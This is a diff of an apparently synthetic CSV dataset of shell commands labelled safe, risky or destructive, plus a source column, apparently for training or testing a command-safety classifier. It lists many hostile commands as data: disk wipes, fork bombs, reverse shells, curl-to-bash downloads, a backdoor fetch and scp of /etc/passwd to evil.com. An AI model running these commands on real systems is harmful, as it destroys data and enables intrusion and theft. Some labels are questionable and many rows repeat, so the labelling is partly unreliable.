-rm -rf /var,destructive
-echo hello world,safe
-ls /var/log,safe
-sudo docker,safe
-mkdir | grep -i error,safe
-dd if=/dev/urandom of=/dev/sda bs=4M,destructive
-cp -r assets dist/,safe
-export LD_PRELOAD=/home/user/evil.so,risky
-rm -rf tmp/*,risky
-cp src/,safe
-sudo rm,destructive
-rm -rf /*,destructive
-echo 'working' && cp,safe
-dd if=/dev/zero of=/dev/mmcblk0 bs=4M,destructive
-mkfs.xfs /dev/nvme0n1,destructive
-ss -tulpn,safe
-systemctl --help,safe
-echo admin:x:0:0 >> /etc/passwd,risky
-sudo apt,safe
-init 0,risky
-mkdir data/,safe
-echo admin:x:0:0 >> /etc/passwd,risky
-apt --help,safe
-dd if=/dev/sda of=/dev/null bs=1M count=1,destructive
-dd if=/dev/urandom of=/dev/mmcblk0 bs=4M,destructive
-cat --help,safe
-head | grep -i ok,safe
-mkfs.xfs /dev/sda,destructive
-echo 'working' && mkdir,safe
-sudo ls,safe
-mkfs.vfat /dev/sda,destructive
-mv --help,safe
-sudo wipefs,destructive
-crontab -r,risky
-mkfs.ext4 /dev/sda,destructive
-dd if=/dev/zero of=/dev/sdb bs=4M,destructive
-head /tmp,safe
-export LD_PRELOAD=/tmp/lib.so,risky
-pip --help,safe
-curl http://10.0.0.9/install.sh | bash,risky
-export LD_PRELOAD=/tmp/lib.so,risky
-printf 'name: %s\n' adhi,safe
-shred -u /dev/sda,destructive
-sudo rm -rf /lib/modules,destructive
-apt --help,safe
-sudo rm -rf /sbin,destructive
-head | grep -i ok,safe
-pip --help,safe
-shred -n 3 /dev/sdb,destructive
-chmod -R 777 .,risky
-mkfs.btrfs /dev/sda,destructive
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-head -v,safe
-dd if=/dev/zero of=/dev/sdb1,destructive
-git | grep -i error,safe
-echo 'working' && systemctl,safe
-sudo grep,safe
-echo root2:x:0:0 >> /etc/passwd,risky
-echo 'working' && docker,safe
-npm start,safe
-bash -c '$(curl http://example.com/p)',risky
-export LD_LIBRARY_PATH=/tmp,risky
-cat ~/.ssh/id_rsa,risky
-curl http://example.com/install.sh | bash,risky
-docker | grep -i error,safe
-dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive
-sudo systemctl,safe
-pip -v,safe
-shred -vfz /dev/sda,destructive
-curl http://example.com/install.sh | bash,risky
-cp --help,safe
-sudo mkdir,safe
-sudo head,safe
-cp ~/documents,safe
-npm run build,safe
-curl http://10.0.0.9/install.sh | bash,risky
-pip src/,safe
-curl -s https://api.example.com/status,safe
-date,safe
-export LD_PRELOAD=/home/user/evil.so,risky
-mv src/,safe
-systemctl | grep -i warn,safe
-chattr -i /etc/passwd,risky
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-sudo shred,destructive
-poweroff --force,risky
-echo root2:x:0:0 >> /etc/passwd,risky
-scp /etc/passwd user@evil.com:/tmp/,risky
-apt --help,safe
-echo 'working' && cp,safe
-docker --help,safe
-sudo rm -rf /var/tmp/old*,risky
-zip -r backup.zip data/,safe
-rm -rf /*,destructive
-cat | grep -i fail,safe
-chmod -R 766 .,risky
-mkdir | grep -i warn,safe
-sudo systemctl stop apparmor,risky
-curl http://example.com/install.sh | bash,risky
-docker | grep -i warn,safe
-apt -v,safe
-chmod 4777 /tmp/x,risky
-echo 'user:hash' >> /etc/passwd,risky
-grep ..,safe
-curl http://10.0.0.9/install.sh | bash,risky
-head data/,safe
-uptime,safe
-mkfs.btrfs /dev/sda,destructive
-halt -f,risky
-echo admin:x:0:0 >> /etc/passwd,risky
-docker run --privileged -it ubuntu bash,risky
-grep | grep -i error,safe
-rm -rf /etc,destructive
-sudo rm -rf /etc/ssh,destructive
-shred -vfz /dev/sda,destructive
-shred -n 3 /dev/sda,destructive
-mkdir src/,safe
-chmod -R 777 /var/www,risky
-chmod -R 766 /opt/app,risky
-chmod 4755 /tmp/x,risky
-head | grep -i fail,safe
-git commit -m 'fix: bug',safe
-curl http://example.com/install.sh | bash,risky
-docker --help,safe
-chmod -R 777 /var/www,risky
-systemctl --help,safe
-sudo mkdir,safe
-cp | grep -i error,safe
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-chmod -R 777 /opt/app,risky
-grep | grep -i warn,safe
-systemctl | grep -i warn,safe
-chmod u+s /tmp/x,risky
-export LD_PRELOAD=/home/user/evil.so,risky
-mv ~/documents,safe
-rm -rf /*,destructive
-echo 'working' && apt,safe
-echo 'working' && head,safe
-cd ~,safe
-pip -v,safe
-sudo dd,destructive
-docker | grep -i error,safe
-curl http://10.0.0.9/install.sh | bash,risky
-systemctl -v,safe
-rm -rf __pycache__,risky
-ls ..,safe
-sudo dd,destructive
-sudo grep,safe
-chmod -R 766 /opt/app,risky
-head /tmp,safe
-export LD_LIBRARY_PATH=/home/user/evil.so,risky
-ls -v,safe
-chmod 4777 /tmp/x,risky
-chmod u+s /tmp/x,risky
-curl http://10.0.0.9/install.sh | bash,risky
-git -v,safe
-sudo mkfs,destructive
-echo 'working' && mkdir,safe
-shred -vfz /dev/mmcblk0,destructive
-grep build/,safe
-sudo rm -fr /home,destructive
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-rm -rf /var,destructive
-grep --help,safe
-chmod 4755 /usr/bin/find,risky
-curl http://example.com/install.sh | bash,risky
-whoami,safe
-echo 'working' && systemctl,safe
-apt /tmp,safe
-systemctl --help,safe
-docker images,safe
-wipefs -af /dev/nvme0n1,destructive
-chmod u+s /bin/bash,risky
-echo admin:x:0:0 >> /etc/passwd,risky
-echo 'working' && cp,safe
-yes > /dev/null &,destructive
-pip -v,safe
-sudo git,safe
-blkid,safe
-export LD_LIBRARY_PATH=/tmp/lib.so,risky
-rm -rf /var,destructive
-rm -rf dist,risky
-dd if=/dev/zero of=/dev/sda bs=1M,destructive
-sudo mkdir,safe
-ip addr,safe
-curl http://example.com/install.sh | bash,risky
-export LD_PRELOAD=/tmp/lib.so,risky
-mkfs.vfat /dev/nvme0n1,destructive
-ls -l /home/user,safe
-sudo wipefs,destructive
-curl http://example.com/install.sh | bash,risky
-rm -rf *,destructive
-cp | grep -i fail,safe
-cp -v,safe
-ls | grep -i fail,safe
-"sh -c ""$(wget -qO- http://example.com/run.sh)""",risky
-export LD_PRELOAD=/tmp/lib.so,risky
-make -j4,safe
-shred -u /dev/sdb,destructive
-curl http://example.com/install.sh | bash,risky
-echo 'working' && cp,safe
-rm -rf /bin,destructive
-curl http://10.0.0.9/install.sh | bash,risky
-grep | grep -i warn,safe
-pip data/,safe
-gdb -ex 'shell /bin/sh',risky
-cp | grep -i fail,safe
-apt | grep -i error,safe
-curl http://example.com/install.sh | bash,risky
+command,label,source
+echo 'working' && ls,safe,synthetic
+rm -rf dist,risky,synthetic
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+wipefs -a /dev/sda,destructive,mitre-attack
+cat -v,safe,synthetic
+sudo pip,safe,synthetic
+mkfs.ext4 /dev/sda,destructive,synthetic
+free -h,safe,bash-history
+bomb() { bomb | bomb & }; bomb,destructive,mitre-attack
+echo 'working' && cp,safe,synthetic
+chmod -R 766 /opt/app,risky,synthetic
+chattr -i /etc/passwd,risky,mitre-attack
+crontab -e,risky,mitre-attack
+sudo pip,safe,synthetic
+rm -rf /*,destructive,synthetic
+cat -v,safe,synthetic
+echo 'working' && mv,safe,synthetic
+systemctl disable ufw,risky,mitre-attack
+rm -rf dist,risky,synthetic
+echo 'working' && docker,safe,synthetic
+head | grep -i fail,safe,synthetic
+systemctl -v,safe,synthetic
+apt | grep -i fail,safe,synthetic
+mv ..,safe,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+head /tmp,safe,synthetic
+dd if=/dev/urandom of=/dev/sdb bs=1M,destructive,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+echo 'aGVsbG8=' | base64 -d,risky,mitre-attack
+sudo ls,safe,synthetic
+mkfs.ext4 /dev/sdb1,destructive,synthetic
+mkfs.vfat /dev/sdb1,destructive,synthetic
+shred -u /dev/mmcblk0,destructive,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+chmod -R 777 /tmp/data,risky,synthetic
+pip --help,safe,synthetic
+df -i,safe,bash-history
+tar czf - /home/user | nc 10.0.0.5 4444,risky,mitre-attack
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+sudo head,safe,synthetic
+sudo grep,safe,synthetic
+find /home/user -type f -name '*.log',safe,bash-history
+cp config.example.yml config.yml,safe,bash-history
+sudo pip,safe,synthetic
+dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive,synthetic
+rm -rf /boot,destructive,synthetic
+sudo shred,destructive,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+ls .,safe,synthetic
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+shred -n 3 /dev/sda,destructive,synthetic
+ls | grep -i error,safe,synthetic
+mkfs.ext4 /dev/sda,destructive,synthetic
+systemctl | grep -i ok,safe,synthetic
+shred -vfz /dev/sda,destructive,synthetic
+rm -rf build,risky,synthetic
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
+mkfs.xfs /dev/nvme0n1,destructive,synthetic
+rm -rf /,destructive,synthetic
+shred -u /dev/sdb,destructive,mitre-attack
+nc 10.0.0.5 1234 -e /bin/bash,risky,mitre-attack
+dd if=/dev/zero of=/dev/sda bs=4M,destructive,mitre-attack
+shred -vfz /dev/sda,destructive,synthetic
+apt ..,safe,synthetic
+echo 'working' && grep,safe,synthetic
+apt list --installed,safe,bash-history
+echo 'working' && mv,safe,synthetic
+chmod -R 766 /var/www,risky,synthetic
+cal 2026,safe,bash-history
+export LD_PRELOAD=/home/user/evil.so,risky,synthetic
+chmod 777 /opt/app,risky,mitre-attack
+docker ..,safe,synthetic
+mount --bind /proc /mnt/proc,risky,mitre-attack
+grep -i 'failed' auth.log,safe,bash-history
+ll,safe,bash-history
+rm -rf node_modules/.cache,risky,synthetic
+cp .,safe,synthetic
+systemctl | grep -i fail,safe,synthetic
+sudo usermod -aG sudo normaluser,risky,mitre-attack
+dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive,synthetic
+docker -v,safe,synthetic
+ls -v,safe,synthetic
+pip --help,safe,synthetic
+echo 'working' && docker,safe,synthetic
+grep -v,safe,synthetic
+ping -c 4 google.com,safe,bash-history
+PATH=$PATH:/tmp,risky,mitre-attack
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+shred -n 3 /dev/mmcblk0,destructive,synthetic
+sudo su -,risky,mitre-attack
+cat -v,safe,synthetic
+echo 'working' && ls,safe,synthetic
+tar --checkpoint=1 --checkpoint-action=exec=/bin/sh,risky,gtfobins
+rm -rf ~,destructive,synthetic
+sudo wipefs,destructive,synthetic
+mkdir -v,safe,synthetic
+rm -rf /boot,destructive,mitre-attack
+"sh -c ""$(wget -qO- http://example.com/run.sh)""",risky,mitre-attack
+lsblk,safe,bash-history
+sort -k2 -n data.csv,safe,bash-history
+sudo mkfs,destructive,synthetic
+efibootmgr --delete-bootnum --bootnum 0000,destructive,mitre-attack
+cp -v,safe,synthetic
+cat | grep -i warn,safe,synthetic
+shred -vfz /dev/mmcblk0,destructive,synthetic
+mkfs.xfs /dev/sdb1,destructive,synthetic
+sudo rm -rf /boot/grub,destructive,mitre-attack
+pip -v,safe,synthetic
+chmod 4755 /tmp/x,risky,synthetic
+node --version,safe,bash-history
+pip | grep -i warn,safe,synthetic
+kill -9 $(pgrep -u root),risky,mitre-attack
+export LD_PRELOAD=/tmp/lib.so,risky,synthetic
+chmod -R 777 /,destructive,mitre-attack
+sudo cat,safe,synthetic
+echo 'working' && apt,safe,synthetic
+apt ..,safe,synthetic
+dd if=/dev/urandom of=/dev/sda,destructive,mitre-attack
+sudo groupadd developers,safe,bash-history
+grep --help,safe,synthetic
+sudo head,safe,synthetic
+mv old_name.py new_name.py,safe,bash-history
+crontab -l,safe,bash-history
+echo 'working' && grep,safe,synthetic
+sudo mv,safe,synthetic
+rm -rf /tmp/test/*,risky,synthetic
+apt | grep -i warn,safe,synthetic
+rm -rf dist,risky,synthetic
+sudo systemctl status sshd,safe,bash-history
+chmod -R 777 /opt/app,risky,synthetic
+scp -r ./backup user@server:/backups/,safe,bash-history
+cp -v,safe,synthetic
+rm -rf dist,risky,synthetic
+chmod 4755 /tmp/x,risky,synthetic
+rm -rf /,destructive,synthetic
+sudo mkdir,safe,synthetic
+halt -f,risky,mitre-attack
+systemctl | grep -i fail,safe,synthetic
+head -v,safe,synthetic
+poweroff --force,risky,mitre-attack
+rm -rf tmp/*,risky,synthetic
+shutdown -h now,risky,mitre-attack
+rm -rf /var,destructive,synthetic
+shred -n 3 /dev/sda,destructive,synthetic
+cat /etc/os-release,safe,bash-history
+chmod -R 777 /var/www,risky,mitre-attack
+sh -i >& /dev/udp/10.0.0.5/7777 0>&1,risky,mitre-attack
+rm -rf ~,destructive,synthetic
+pip ..,safe,synthetic
+parted /dev/sda mklabel gpt,destructive,mitre-attack
+nsenter -t 1 -m -u -i -n -- bash,risky,mitre-attack
+echo 'working' && systemctl,safe,synthetic
+ls -v,safe,synthetic
+sudo chmod 777 /usr,destructive,mitre-attack
+chmod u+s /tmp/x,risky,synthetic
+rm -rf /var,destructive,synthetic
+rm -rf __pycache__,risky,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+chmod -R 777 /var/www,risky,synthetic
+sudo dd,destructive,synthetic
+mkdir --help,safe,synthetic
+git push,safe,bash-history
+rm -rf /tmp/test/*,risky,synthetic
+chmod 4777 /bin/bash,risky,synthetic
+echo 'user:hash' >> /etc/passwd,risky,mitre-attack
+sudo ls,safe,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+apt -v,safe,synthetic
+mv --help,safe,synthetic
+git stash,safe,bash-history
+sudo grep,safe,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+dd if=/dev/urandom of=/dev/sdb bs=1M,destructive,synthetic
+export LD_LIBRARY_PATH=/tmp,risky,mitre-attack
+usermod -o -u 0 username,risky,mitre-attack
+cat file.txt,safe,bash-history
+echo 'working' && git,safe,synthetic
+mv /var/log,safe,synthetic
+dd if=/dev/urandom of=/dev/sdb bs=4M,destructive,synthetic
+gdb -ex 'shell /bin/sh',risky,gtfobins
+git build/,safe,synthetic
+mkfs.vfat /dev/sdb1,destructive,synthetic
+shred -u /dev/mmcblk0,destructive,synthetic
+cat data/,safe,synthetic
+rg 'TODO' src/,safe,bash-history
+grep ..,safe,synthetic
+rm -rf tmp/*,risky,synthetic
+rm -rf /tmp/test/*,risky,synthetic
+mkfs.xfs /dev/sdb1,destructive,synthetic
+chmod -R 777 /tmp/data,risky,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+echo 'working' && systemctl,safe,synthetic
+head --help,safe,synthetic
+rm -rf /etc,destructive,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
+ls,safe,bash-history
+sudo head,safe,synthetic
+sudo dd if=image.iso of=/dev/sda bs=4M,destructive,mitre-attack
+htop,safe,bash-history
+PYTHONPATH=/tmp python script.py,risky,mitre-attack
+echo 'working' && pip,safe,synthetic
+sudo rm -rf /var/tmp/old*,risky,mitre-attack
+git --help,safe,synthetic
+mkfs.vfat /dev/sdb1,destructive,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+tar --checkpoint-action=exec='echo hacked',risky,gtfobins
+chmod 777 ~/.ssh/config,risky,mitre-attack
+ls -lah /var/log | tail -20,safe,bash-history
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+rm -rf build,risky,synthetic
+mkdir -v,safe,synthetic
+chmod 4755 /bin/bash,risky,synthetic
+chmod 4755 /bin/busybox,risky,synthetic
+export LD_PRELOAD=/home/user/evil.so,risky,synthetic
+lsusb,safe,bash-history
+cat | grep -i ok,safe,synthetic
+head -20 access.log,safe,bash-history
+mkdir | grep -i warn,safe,synthetic
+sudo git,safe,synthetic
+docker compose up -d,safe,bash-history
+chmod 4755 /bin/busybox,risky,synthetic
+chmod 4755 /bin/busybox,risky,synthetic
+mv --help,safe,synthetic
+mv -v,safe,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+echo 'working' && head,safe,synthetic
+mkdir /var/log,safe,synthetic
+apt --help,safe,synthetic
+sudo rm,destructive,synthetic
+docker run -v /:/host ubuntu bash,risky,mitre-attack
+npm install,safe,bash-history
+echo 'working' && ls,safe,synthetic
+pwd,safe,bash-history
+grep -v,safe,synthetic
+cp --help,safe,synthetic
+ls -la,safe,bash-history
+wget -qO- http://example.com/setup.sh | sh,risky,mitre-attack
+systemctl /tmp,safe,synthetic
+echo 'working' && git,safe,synthetic
+mv --help,safe,synthetic
+chmod -R 766 /opt/app,risky,synthetic
+parted /dev/sda rm 1,destructive,mitre-attack
+rm -rf /*,destructive,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+ls ~/documents,safe,synthetic
+pip /tmp,safe,synthetic
+find / -delete,destructive,mitre-attack
+apt -v,safe,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+top,safe,bash-history
+dd if=/dev/urandom of=/dev/sdb bs=1M,destructive,synthetic
+echo 'working' && mv,safe,synthetic
+echo 'working' && head,safe,synthetic
+chown root:root /tmp/x && chmod 4755 /tmp/x,risky,mitre-attack
+curl http://example.com/install.sh | bash,risky,synthetic
+nmap -p 22 localhost,safe,bash-history
+:(){ :|:& };: &,destructive,mitre-attack
+dd if=/dev/urandom of=/dev/nvme0n1 bs=4M,destructive,synthetic
+chmod -R 766 /var/www,risky,synthetic
+systemctl --help,safe,synthetic
+cat ~/.ssh/id_rsa,risky,mitre-attack
+echo 'working' && cat,safe,synthetic
+kill -9 -1,risky,mitre-attack
+which python3,safe,bash-history
+rm -rf build,risky,synthetic
+tail -f /var/log/syslog,safe,bash-history
+mkfs.ext4 /dev/sdb1,destructive,synthetic
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+head --help,safe,synthetic
+rm -rf --no-preserve-root /,destructive,mitre-attack
+systemctl --help,safe,synthetic
+sudo rm -rf /var/lib/dpkg,destructive,mitre-attack
+sudo git,safe,synthetic
+"awk 'BEGIN {system(""/bin/sh"")}'",risky,gtfobins
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+hostname,safe,bash-history
+mkdir ..,safe,synthetic
+systemctl status nginx,safe,bash-history
+:(){ :|:& };:,destructive,mitre-attack
+sudo git,safe,synthetic
+ls --help,safe,synthetic
+dd if=/dev/urandom of=/dev/nvme0n1 bs=4M,destructive,synthetic
+chmod u+s /bin/busybox,risky,synthetic
+shred -u /dev/sdb,destructive,synthetic
+chmod -R 777 /var/www,risky,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+sudo journalctl -u ssh --since 1 hour ago,safe,bash-history
+rm -rf /usr,destructive,synthetic
+shred -vfz /dev/mmcblk0,destructive,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+wipe -fd /dev/sda,destructive,mitre-attack
+wget http://evil.com/backdoor.py -O /tmp/b.py && python /tmp/b.py,risky,mitre-attack
+sudo apt,safe,synthetic
+cat --help,safe,synthetic
+mkdir --help,safe,synthetic
+sudo systemctl,safe,synthetic
+export LD_PRELOAD=/home/user/evil.so,risky,synthetic
+git | grep -i error,safe,synthetic
+mkdir --help,safe,synthetic
+head -v,safe,synthetic
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
+mkfs.ext4 /dev/sda,destructive,synthetic
+chmod u+s /bin/bash,risky,synthetic
+grep -v,safe,synthetic
+ls --help,safe,synthetic
+rm -rf /etc,destructive,mitre-attack
+export PATH=$PATH:/opt/bin,safe,bash-history
+sudo apt,safe,synthetic
+chmod -R 766 .,risky,synthetic
+shred -n 3 /dev/mmcblk0,destructive,synthetic
+sudo pip,safe,synthetic
+git pull origin main,safe,bash-history
+git /tmp,safe,synthetic
+echo 'working' && head,safe,synthetic
+git --help,safe,synthetic
+sudo ls,safe,synthetic
+mv /tmp,safe,synthetic
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+rm -rf node_modules/.cache,risky,synthetic
+ufw disable,risky,mitre-attack
+mkdir | grep -i error,safe,synthetic
+sudo ls,safe,synthetic
+grub-install --recheck --removable,destructive,mitre-attack
+cat --help,safe,synthetic
+chmod 4755 /bin/bash,risky,synthetic
+docker | grep -i fail,safe,synthetic
+shred -u /dev/sda,destructive,synthetic
+grep -v,safe,synthetic
+rm -rf node_modules/.cache,risky,synthetic
+dig example.com,safe,bash-history
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+shred -vfz /dev/sdb,destructive,synthetic
+rm -rf /usr,destructive,synthetic
+chmod 4777 /bin/bash,risky,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+echo 'working' && docker,safe,synthetic
+git /var/log,safe,synthetic
+chmod 4755 /bin/busybox,risky,synthetic
+echo 'working' && grep,safe,synthetic
+chmod 4777 /tmp/x,risky,synthetic
+sudo wipefs,destructive,synthetic
+sudo ls,safe,synthetic
+echo 'working' && cat,safe,synthetic
+rm -rf /*,destructive,synthetic
+yes | head -c 1000000000 > /dev/null,destructive,mitre-attack
+systemctl src/,safe,synthetic
+git data/,safe,synthetic
+rm -rf tmp/*,risky,synthetic
+dd if=/dev/urandom of=/dev/sda bs=512,destructive,synthetic
+apt --help,safe,synthetic
+scp /etc/passwd user@evil.com:/tmp/,risky,mitre-attack
+chmod -R 766 /tmp/data,risky,synthetic
+rm -rf __pycache__,risky,synthetic
+sudo docker,safe,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+journalctl -u nginx --since today,safe,bash-history
+su - root,risky,mitre-attack
+sudo cp,safe,synthetic
+sudo cat,safe,synthetic
+docker --help,safe,synthetic
+cp --help,safe,synthetic
+rm -rf /tmp/test/*,risky,synthetic
+unzip release.zip -d /opt/app,safe,bash-history
+git ~/documents,safe,synthetic
+cp /var/log,safe,synthetic
+id,safe,bash-history
+rm -rf /*,destructive,synthetic
+cmake ..,safe,bash-history
+chmod -R 766 /opt/app,risky,synthetic
+rm -rf node_modules/.cache,risky,synthetic
+mv -v,safe,synthetic
+chmod 4777 /bin/busybox,risky,synthetic
+chmod -R 777 /opt/app,risky,synthetic
+chmod 4755 /usr/bin/find,risky,mitre-attack
+sudo shred,destructive,synthetic
+export LD_PRELOAD=/tmp/lib.so,risky,synthetic
+apt update,safe,bash-history
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+chmod -R 777 .,risky,synthetic
+sudo systemctl stop apparmor,risky,mitre-attack
+rm -rf dist,risky,synthetic
+git | grep -i ok,safe,synthetic
+echo 'working' && pip,safe,synthetic
+chmod u+s /tmp/x,risky,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+iptables -F,risky,mitre-attack
+chmod u+s /bin/bash,risky,synthetic
+chmod u+s /bin/busybox,risky,mitre-attack
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+mkfs.ext4 /dev/nvme0n1,destructive,synthetic
+bash -c '$(curl http://example.com/p)',risky,mitre-attack
+cargo build --release,safe,bash-history
+mkdir src/,safe,synthetic
+while true; do true; done,destructive,mitre-attack
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+sudo pip,safe,synthetic
+chmod 4755 /bin/busybox,risky,synthetic
+dd if=/dev/zero of=/dev/nvme0n1 bs=512,destructive,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+mkdir -p projects/backend/src,safe,bash-history
+git --help,safe,synthetic
+git | grep -i ok,safe,synthetic
+shred -n 3 /dev/sdb,destructive,synthetic
+systemctl -v,safe,synthetic
+sudo head,safe,synthetic
+rm -rf build,risky,synthetic
+ls -v,safe,synthetic
+echo 'working' && cat,safe,synthetic
+cat | grep -i ok,safe,synthetic
+rm -rf build,risky,synthetic
+chmod -R 777 /tmp/data,risky,synthetic
+rm -rf build,risky,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+sudo dd,destructive,synthetic
+chmod 755 script.sh,safe,bash-history
+docker ~/documents,safe,synthetic
+head /tmp,safe,synthetic
+mkdir -v,safe,synthetic
+rm -rf /usr,destructive,mitre-attack
+mkdir -v,safe,synthetic
+echo 'working' && git,safe,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+rm -rf tmp/*,risky,synthetic
+cp build/,safe,synthetic
+cp --help,safe,synthetic
+curl http://evil.com/shell.sh -o /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh,risky,mitre-attack
+mv -v,safe,synthetic
+dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive,synthetic
+mkdir .,safe,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+chmod 4777 /bin/busybox,risky,synthetic
+shred -u /dev/sda,destructive,synthetic
+echo 'working' && grep,safe,synthetic
+mv | grep -i error,safe,synthetic
+echo 'IyEvYmluL2Jhc2gK' | base64 -d | bash,risky,mitre-attack
+echo 'working' && apt,safe,synthetic
+apt -v,safe,synthetic
+dd if=/dev/zero of=/dev/mmcblk0 bs=512,destructive,synthetic
+rm -rf ~,destructive,mitre-attack
+rm -rf node_modules/.cache,risky,synthetic
+ps aux,safe,bash-history
+sudo rm -rf /usr/bin,destructive,mitre-attack
+shred -u /dev/mmcblk0,destructive,synthetic
+mkfs.xfs /dev/sdb1,destructive,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+git -v,safe,synthetic
+chmod -R 777 .,risky,synthetic
+chmod 777 /etc/hosts,risky,mitre-attack
+apt .,safe,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+curl http://10.0.0.9/install.sh | bash,risky,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+systemctl -v,safe,synthetic
+echo admin:x:0:0 >> /etc/passwd,risky,synthetic
+echo 'working' && head,safe,synthetic
+docker --help,safe,synthetic
+head | grep -i warn,safe,synthetic
+sudo chmod 777 /etc/shadow,risky,mitre-attack
+shred -n 3 /dev/sdb,destructive,synthetic
+apt /var/log,safe,synthetic
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+cat .,safe,synthetic
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+systemctl /tmp,safe,synthetic
+echo 'working' && git,safe,synthetic
+mkdir -v,safe,synthetic
+git --help,safe,synthetic
+cat .,safe,synthetic
+dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive,synthetic
+mkfs.ext4 /dev/sdb1,destructive,synthetic
+fdisk /dev/sda && mkfs.ext4 /dev/sda1,destructive,mitre-attack
+apt /tmp,safe,synthetic
+sudo apt,safe,synthetic
+mv -v,safe,synthetic
+export LD_PRELOAD=/tmp/lib.so,risky,synthetic
+rm -rf tmp/*,risky,synthetic
+sudo grep,safe,synthetic
+mkfs.vfat /dev/sda,destructive,synthetic
+python app.py,safe,bash-history
+git -v,safe,synthetic
+git add .,safe,bash-history
+chmod -R 777 /var/www,risky,synthetic
+uniq -c access.log | sort -rn | head,safe,bash-history
+make,safe,bash-history
+echo 'working' && systemctl,safe,synthetic
+source ~/.bashrc,safe,bash-history
+chmod 4777 /bin/bash,risky,synthetic
+chmod -R 777 /tmp/data,risky,synthetic
+pip /var/log,safe,synthetic
+sudo systemctl,safe,synthetic
+sudo wipefs,destructive,synthetic
+sudo cp,safe,synthetic
+pip -v,safe,synthetic
+rm -rf /tmp/test/*,risky,synthetic
+curl http://example.com/install.sh | bash,risky,synthetic
+grep --help,safe,synthetic
+sudo dd,destructive,synthetic
+head -v,safe,synthetic
+rm -rf /tmp/test/*,risky,synthetic
+docker ps,safe,bash-history
+mkfs.xfs /dev/sda,destructive,synthetic
+git -v,safe,synthetic
+uname -a,safe,bash-history
+export LD_PRELOAD=/tmp/lib.so,risky,synthetic
+sudo apt,safe,synthetic
+dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive,synthetic
+export LD_PRELOAD=/tmp/lib.so,risky,synthetic
+echo 'working' && apt,safe,synthetic
+grep data/,safe,synthetic
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
+sudo rm,destructive,synthetic
+echo 'working' && grep,safe,synthetic
+rm -rf tmp/*,risky,synthetic
+export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
+dmesg | tail,safe,bash-history
+mv --help,safe,synthetic
+git checkout -b feature/new,safe,bash-history
+rm -rf __pycache__,risky,synthetic
+pip --help,safe,synthetic
+sudo setenforce 0,risky,mitre-attack
+mkfs.btrfs /dev/nvme0n1,destructive,synthetic
+chmod 4755 /bin/busybox,risky,synthetic
+grep -v,safe,synthetic
+dd if=/dev/urandom of=/dev/nvme0n1 bs=512,destructive,synthetic
+docker -v,safe,synthetic
+ls --help,safe,synthetic
+sudo git,safe,synthetic
+echo 'working' && pip,safe,synthetic
+export LD_PRELOAD=/home/user/evil.so,risky,synthetic
+python3 main.py --port 8080,safe,bash-history
+chmod 4755 /bin/bash,risky,synthetic
+touch newfile.txt,safe,bash-history
+cp --help,safe,synthetic
+clear,safe,bash-history
+echo root2:x:0:0 >> /etc/passwd,risky,synthetic
+sudo rm,destructive,synthetic
+ls | grep -i warn,safe,synthetic
+head -v,safe,synthetic
+export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
